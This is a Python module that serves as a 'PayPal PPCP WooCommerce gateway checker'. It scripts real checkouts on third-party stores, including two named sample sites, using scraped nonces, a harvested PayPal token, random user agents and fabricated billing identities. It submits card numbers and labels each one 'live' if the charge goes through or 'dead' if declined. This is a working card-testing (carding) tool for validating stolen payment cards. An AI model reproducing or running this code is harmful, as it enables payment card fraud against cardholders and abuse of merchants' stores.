"""
ppcp.py — PayPal PPCP WooCommerce gateway checker.

Flow: product discovery → ATC → checkout nonces → PayPal client-id
      → create-order → confirm-payment-source → approve-order
      → wc-ajax=checkout → classify response.

All shared helpers (session builders, identity, address pools) live in utils.py.
"""

import base64
import json
import re
from urllib.parse import urlencode

import requests

from .utils import (
    REQUEST_TIMEOUT,
    convert_year,
    discover_product_id,
    get_billing_identity,
    get_country_for_domain,
    get_str,
    random_ua,
)


# ── Response classification ──────────────────────────────────────────────────────────────

_DEAD_KEYWORDS = [
    "declined",
    "do not honor",
    "transaction refused",
    "transaction has been refused",
    "payment_denied",           # paypal error code – user confirmed dead
    "payee_not_enabled_for_card_processing",
    "order_not_approved",
    "duplicate_invoice_id",
    "transaction_refused",
    "payment provider declined",
    "we were unable to process your order",
    "unable to process your payment",
    "sorry, your session has expired",
    "nonce error",
    "invalid card",
    "card was declined",
    "insufficient funds",
    "card has expired",
    "expired card",
    "security code",
    "payment could not be processed",
    "fraud",
    "blocked",
    "exceeds limit",
    "call your bank",
    "contact your bank",
    "restricted card",
    "transaction not allowed",
    "card not supported",
]


def _classify(payment_text: str, amount: str, card_str: str) -> dict:
    """Classify the final wc-ajax=checkout response into live / dead / unknown."""

    # Definitive success: result=success + redirect contains order-received
    if '"result":"success"' in payment_text and "order-received" in payment_text:
        return {"status": "live", "message": "Charged", "amount": amount, "card": card_str}

    if not payment_text.strip():
        return {"status": "unknown", "message": "Empty response", "amount": amount, "card": card_str}

    # Reload-only response (expired nonce / session)
    try:
        _parsed = json.loads(payment_text)
        if _parsed.get("reload") is True:
            return {"status": "dead", "message": "Nonce expired / Reload", "amount": amount, "card": card_str}
    except Exception:
        pass

    # Strip HTML tags from messages field for analysis
    raw_msg = ""
    try:
        _parsed = json.loads(payment_text)
        raw_msg = _parsed.get("messages", "") or _parsed.get("message", "") or ""
    except Exception:
        raw_msg = payment_text

    msg_clean = re.sub(r"<[^>]+>", " ", str(raw_msg))
    msg_clean = re.sub(r"\s+", " ", msg_clean).strip()

    # Extract PayPal error code (e.g. "#PAYMENT_DENIED") as the short label
    paypal_code = re.search(r"#([A-Z_]{3,})", payment_text)
    short_msg   = paypal_code.group(1) if paypal_code else (msg_clean[:120] or "Unknown")

    # Check combined text against dead keywords
    combined = (msg_clean + " " + payment_text).lower()
    for kw in _DEAD_KEYWORDS:
        if kw in combined:
            return {"status": "dead", "message": short_msg, "amount": amount, "card": card_str}

    return {"status": "unknown", "message": short_msg or "Unknown response", "amount": amount, "card": card_str}


# ── Amount extraction ────────────────────────────────────────────────────────────────────

_AMOUNT_PATTERNS = [
    r'order[_-]total.*?<(?:span|bdi)[^>]*>.*?<span[^>]*>\s*([^<]+?)\s*</span>\s*([\d.,]+)',
    r'<tr[^>]*class="[^"]*order-total[^"]*".*?<(?:span|bdi)[^>]*>\s*(?:[^<]*<[^>]+>)?\s*([\d.,]+)',
    r'class="woocommerce-Price-amount[^"]*"[^>]*>.*?<span[^>]*>[^<]*</span>\s*([\d.,]+)',
    r'<span class="woocommerce-Price-currencySymbol">([^<]*)</span>\s*([\d.,]+)',
]


def _extract_amount(html: str) -> str:
    for pat in _AMOUNT_PATTERNS:
        m = re.search(pat, html, re.IGNORECASE | re.DOTALL)
        if m:
            num = m.group(m.lastindex)
            sym = m.group(m.lastindex - 1) if m.lastindex > 1 else "$"
            sym = re.sub(r"<[^>]+>", "", sym).strip() or "$"
            if sym in ("&pound;", "&#163;"):
                sym = "\xa3"    # £ = Â£ = pound sign
            return f"{sym}{num}"
    return ""


# ── Main checker ──────────────────────────────────────────────────────────────────────────

def check_ppcp(session: requests.Session, domain: str, card_tuple: tuple, **kwargs) -> dict:
    """Check one card against a WooCommerce + PayPal PPCP store.

    Returns:
        {"status": "live"|"dead"|"unknown", "message": str, "amount": str, "card": str}

    Known sample sites:
        - gymsworld.co.uk
        - pci.drabeldamina.org
    """
    cc, mm, yy, cvv = card_tuple
    yy       = convert_year(yy)
    mm       = mm.zfill(2)
    card_str = f"{cc}|{mm}|{yy}" + (f"|{cvv}" if cvv else "")
    ua       = random_ua()

    # ── 1. Discover product ID ─────────────────────────────────────────────────────
    product_id = discover_product_id(session, domain)
    if not product_id:
        return {
            "status":  "unknown",
            "message": "Could not find product on store",
            "amount":  "",
            "card":    card_str,
        }

    # ── 2. Add to cart ────────────────────────────────────────────────────────────
    try:
        session.post(
            f"https://{domain}/?wc-ajax=add_to_cart",
            data={"product_id": product_id, "quantity": "1"},
            headers={
                "User-Agent":        ua,
                "Accept":            "application/json, text/javascript, */*; q=0.01",
                "Content-Type":      "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With":  "XMLHttpRequest",
            },
            timeout=REQUEST_TIMEOUT,
        )
    except Exception as exc:
        return {"status": "unknown", "message": f"ATC error: {exc}", "amount": "", "card": card_str}

    # ── 3. Load checkout page ─────────────────────────────────────────────────────────────
    try:
        r              = session.get(
            f"https://{domain}/checkout/",
            headers={"User-Agent": ua, "Upgrade-Insecure-Requests": "1"},
            timeout=REQUEST_TIMEOUT,
        )
        checkout_html  = r.text
    except Exception as exc:
        return {"status": "unknown", "message": f"Checkout load: {exc}", "amount": "", "card": card_str}

    # Extract nonces
    m = re.search(r'"create_order":\{"endpoint":"[^"]*","nonce":"([^"]+)"', checkout_html)
    create_order_nonce  = m.group(1) if m else ""

    m = re.search(r'"approve_order":\{"endpoint":"[^"]*","nonce":"([^"]+)"', checkout_html)
    approve_order_nonce = m.group(1) if m else ""

    m = re.search(r'"data_client_id"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"', checkout_html, re.DOTALL)
    client_nonce = m.group(1) if m else ""

    wc_nonce = get_str(
        checkout_html,
        'id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="',
        '"',
    )

    amount = _extract_amount(checkout_html)

    if not create_order_nonce:
        return {
            "status":  "unknown",
            "message": "PPCP nonces not found — not a PPCP store?",
            "amount":  amount,
            "card":    card_str,
        }

    # ── 4. Get PayPal access token via ppc-data-client-id ───────────────────────────────
    access_token = ""
    try:
        r          = session.post(
            f"https://{domain}/?wc-ajax=ppc-data-client-id",
            json={
                "set_attribute":                True,
                "nonce":                        client_nonce,
                "user":                         "0",
                "has_subscriptions":            False,
                "paypal_subscriptions_enabled": False,
            },
            headers={
                "Accept":            "application/json, text/javascript, */*; q=0.01",
                "Content-Type":      "application/json",
                "Origin":            f"https://{domain}",
                "Referer":           f"https://{domain}/checkout/",
                "User-Agent":        ua,
                "X-Requested-With":  "XMLHttpRequest",
            },
            timeout=REQUEST_TIMEOUT,
        )
        resp         = r.json()
        token_b64    = resp.get("token", "")
        if token_b64:
            # The token is base64-encoded JSON; pad to ensure valid base64
            padded       = token_b64 + "==" * ((4 - len(token_b64) % 4) % 4)
            token_data   = json.loads(base64.b64decode(padded))
            access_token = token_data.get("paypal", {}).get("accessToken", "")
    except Exception:
        pass   # proceed; PayPal confirm will use no auth header

    # ── 5. Resolve billing identity ─────────────────────────────────────────────────────────────
    ident   = get_billing_identity(domain)
    fname   = ident["fname"]
    lname   = ident["lname"]
    email   = ident["email"]
    phone   = ident["phone"]
    street  = ident["street"]
    city    = ident["city"]
    state   = ident.get("state", "")
    zip_    = ident["zip"]
    country = ident.get("country") or get_country_for_domain(domain)
    passwd  = ident.get("password", "Pass1234!")

    # Short suffix to make username semi-unique across retries
    num_tag = str(id(card_str))[-4:]

    form_encoded = urlencode({
        "billing_first_name":   fname,
        "billing_last_name":    lname,
        "billing_company":      "",
        "billing_country":      country,
        "billing_address_1":    street,
        "billing_address_2":    "",
        "billing_city":         city,
        "billing_state":        state,
        "billing_postcode":     zip_,
        "billing_phone":        phone,
        "billing_email":        email,
        "account_username":     fname + num_tag,
        "account_password":     passwd,
        "order_comments":       "",
        "payment_method":       "ppcp-gateway",
        "terms":                "on",
        "terms-field":          "1",
        "woocommerce-process-checkout-nonce": wc_nonce,
        "_wp_http_referer":     "%2F%3Fwc-ajax%3Dupdate_order_review",
    })

    # ── 6. Create PayPal order ────────────────────────────────────────────────────────────────
    order_id  = ""
    custom_id = ""
    try:
        r    = session.post(
            f"https://{domain}/?wc-ajax=ppc-create-order",
            json={
                "nonce":               create_order_nonce,
                "payer":               None,
                "bn_code":             "Woo_PPCP",
                "context":             "checkout",
                "order_id":            "0",
                "payment_method":      "ppcp-gateway",
                "form_encoded":        form_encoded,
                "createaccount":       False,
                "save_payment_method": False,
            },
            headers={
                "Content-Type": "application/json",
                "User-Agent":   ua,
                "Origin":       f"https://{domain}",
                "Referer":      f"https://{domain}/checkout/",
            },
            timeout=REQUEST_TIMEOUT,
        )
        data = r.json()
        if data.get("success"):
            order_id  = data["data"].get("id", "")
            custom_id = data["data"].get("custom_id", "")
    except Exception as exc:
        return {"status": "unknown", "message": f"Create order error: {exc}", "amount": amount, "card": card_str}

    if not order_id:
        return {"status": "unknown", "message": "Order creation failed", "amount": amount, "card": card_str}

    # ── 7. Confirm payment source via PayPal REST API ──────────────────────────────────
    # Expiry format: YYYY-MM (e.g. 2026-03) — CVV intentionally omitted (matches PHP)
    expiry    = f"{yy}-{mm}"
    pp_hdrs   = {
        "Accept":       "application/json",
        "Content-Type": "application/json",
        "User-Agent":   ua,
    }
    if access_token:
        pp_hdrs["Authorization"] = f"Bearer {access_token}"
    try:
        session.post(
            f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            json={"payment_source": {"card": {"number": cc, "expiry": expiry}}},
            headers=pp_hdrs,
            timeout=REQUEST_TIMEOUT,
        )
    except Exception:
        pass   # proceed regardless; approve step may still work

    # ── 8. Approve order ─────────────────────────────────────────────────────────────────
    try:
        session.post(
            f"https://{domain}/?wc-ajax=ppc-approve-order",
            json={"nonce": approve_order_nonce, "order_id": order_id},
            headers={
                "Content-Type": "application/json",
                "User-Agent":   ua,
                "Origin":       f"https://{domain}",
                "Referer":      f"https://{domain}/checkout/",
            },
            timeout=REQUEST_TIMEOUT,
        )
    except Exception:
        pass   # proceed regardless

    # ── 9. WooCommerce checkout POST ──────────────────────────────────────────────────────────────
    try:
        r = session.post(
            f"https://{domain}/?wc-ajax=checkout",
            data={
                "billing_first_name":   fname,
                "billing_last_name":    lname,
                "billing_company":      "",
                "billing_country":      country,
                "billing_address_1":    street,
                "billing_address_2":    "",
                "billing_city":         city,
                "billing_state":        state,
                "billing_postcode":     zip_,
                "billing_phone":        phone,
                "billing_email":        email,
                "account_username":     fname + num_tag,
                "account_password":     passwd,
                "order_comments":       "",
                "payment_method":       "ppcp-gateway",
                "terms":                "on",
                "terms-field":          "1",
                "woocommerce-process-checkout-nonce": wc_nonce,
                "_wp_http_referer":     "%2F%3Fwc-ajax%3Dupdate_order_review",
                "ppcp-resume-order":    custom_id,
            },
            headers={
                "User-Agent":        ua,
                "Accept":            "application/json, text/javascript, */*; q=0.01",
                "Content-Type":      "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With":  "XMLHttpRequest",
                "Origin":            f"https://{domain}",
                "Referer":           f"https://{domain}/checkout/",
            },
            timeout=REQUEST_TIMEOUT,
        )
        payment_text = r.text or ""
    except Exception as exc:
        return {"status": "unknown", "message": f"Checkout POST: {exc}", "amount": amount, "card": card_str}

    return _classify(payment_text, amount, card_str)
